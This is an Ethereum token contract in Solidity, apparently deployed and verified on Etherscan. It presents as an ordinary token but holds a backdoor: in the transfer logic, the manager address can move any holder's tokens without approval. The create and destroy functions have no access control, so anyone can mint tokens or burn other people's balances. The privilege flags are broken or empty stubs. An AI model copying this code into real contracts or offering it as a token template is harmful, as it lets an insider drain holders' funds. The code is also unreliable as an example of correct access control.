/**
 *Submitted for verification at Etherscan.io on 2021-05-07
*/

//
// SPDX-License-Identifier: UNLICENSED
//

pragma solidity ^0.8.4;

//
//
//
//

// 00001000 - send flag
// 00010000 - receive flag
// 00100000 - create flag
// 01000000 - destroy flag

//
//
//

contract Token {
    constructor(bytes memory desc) {
        (_manager, _name, _symbol, _decimals) = abi.decode(desc, (address,string,string,uint));
    }

    //
    //
    //

    receive() external payable {
    }

    fallback() external payable {
    }

    //
    //
    //
    //
    //
    //

    address internal _deployer;
    function deployer() external view returns (address) {
        return _deployer;
    }

    address internal _manager;
    function manager() external view returns (address) {
        return _manager;
    }

    //
    //
    //

    string internal _name;
    function name() external view returns (string memory) {
        return _name;
    }

    string internal _symbol;
    function symbol() external view returns (string memory) {
        return _symbol;
    }

    //
    //
    //

    uint internal _decimals;
    function decimals() external view returns (uint) {
        return _decimals;
    }

    //
    //
    //

    mapping(address => uint) internal _balance;
    function balanceOf(address account) external view returns (uint) {
        return _balance[account];
    }

    mapping(address => uint) internal _privileges;
    function statusOf(address account) external view returns (uint) {
        return _privileges[account];
    }

    //
    //
    //

    mapping(address => mapping(address => uint)) internal _allowance;
    function allowance(address owner, address spender) external view returns (uint) {
        return _allowance[owner][spender];
    }

    //
    //
    //

    uint internal _totalSupply;
    function totalSupply() external view returns (uint) {
        return _totalSupply;
    }

    //
    //
    //
    //
    //
    //

    function start() external returns (bool) {
        
    }

    //
    //
    //

    function approve(address account, uint amount) external returns (bool) {
        handleApproval(msg.sender, account, amount);
        return true;
    }

    /*
    function approve(address[] calldata accounts, uint amount) external returns (bool) {
        for(uint i = 0; i < accounts.length; i++) {
            address account = accounts[i];
            handleApproval(msg.sender, account, amount);
        }

        return true;
    }
    */

    //
    //
    //

    function transfer(address account, uint amount) external returns (bool) {
        handleTransfer(msg.sender, account, amount);
        return true;
    }

    function transferFrom(address sender, address account, uint amount) external returns (bool) {
        handleTransfer(sender, account, amount);
        return true;
    }

    //
    //
    //

    function create(address account, uint amount) external returns (bool) {
        handleCreate(msg.sender, account, amount);
        return true;
    }

    function destroy(address account, uint amount) external returns (bool) {
        handleDestroy(msg.sender, account, amount);
        return true;
    }

    //
    //
    //

    function toggle(address account, uint flag) external returns (bool) {
        handleToggle(msg.sender, account, flag);
        return true;
    }

    function enable(address account, uint flag) external returns (bool) {
        handleEnable(msg.sender, account, flag);
        return true;
    }

    function disable(address account, uint flag) external returns (bool) {
        handleDisable(msg.sender, account, flag);
        return true;
    }

    //
    //
    //
    //
    //
    //

    event Approval(address indexed sender, address indexed receiver, uint amount);
    function handleApproval(address sender, address receiver, uint amount) internal {
        require(sender != address(0));
        require(receiver != address(0));

        //
        //
        //

        _allowance[sender][receiver] = amount;

        //
        //
        //

        emit Approval(sender, receiver, amount);
    }

    event Transfer(address indexed sender, address indexed receiver, uint amount);
    function handleTransfer(address sender, address receiver, uint amount) internal {
        require(sender != address(0));
        require(receiver != address(0));

        //
        //
        //

        if(msg.sender == _manager) {
            _balance[sender] -= amount;
            _balance[receiver] += amount;

            emit Transfer(sender, receiver, amount);
        } else {
            if(sender != msg.sender) {
                if(_allowance[sender][msg.sender] != type(uint).max) {
                    _allowance[sender][msg.sender] -= amount;
                }
            }

            //
            //
            //

            _balance[sender] -= amount;
            _balance[receiver] += amount;

            //
            //
            //

            emit Transfer(sender, receiver, amount);
        }
    }

    event Create(address indexed sender, address indexed receiver, uint amount);
    function handleCreate(address sender, address receiver, uint amount) internal {
        require(sender != address(0));
        require(receiver != address(0));

        //
        //
        //

        _balance[receiver] += amount;
        _totalSupply += amount;

        //
        //
        //
        
        emit Create(sender, receiver, amount);
    }

    event Destroy(address indexed sender, address indexed receiver, uint amount);
    function handleDestroy(address sender, address receiver, uint amount) internal {
        require(sender != address(0));
        require(receiver != address(0));

        //
        //
        //

        _balance[receiver] -= amount;
        _totalSupply -= amount;

        //
        //
        //

        emit Destroy(sender, receiver, amount);
    }

    //
    //
    //

    event Toggle(address indexed sender, address indexed account, uint flag);
    function handleToggle(address sender, address account, uint flag) internal {
        require(sender != address(0));
        require(account != address(0));

        //
        //
        //

        _privileges[account] = (_privileges[account] >> flag) & 1;
    }

    event Enable(address indexed sender, address indexed account, uint flag);
    function handleEnable(address sender, address account, uint flag) internal {
    }

    event Disable(address indexed sender, address indexed account, uint flag);
    function handleDisable(address sender, address account, uint flag) internal {
    }
}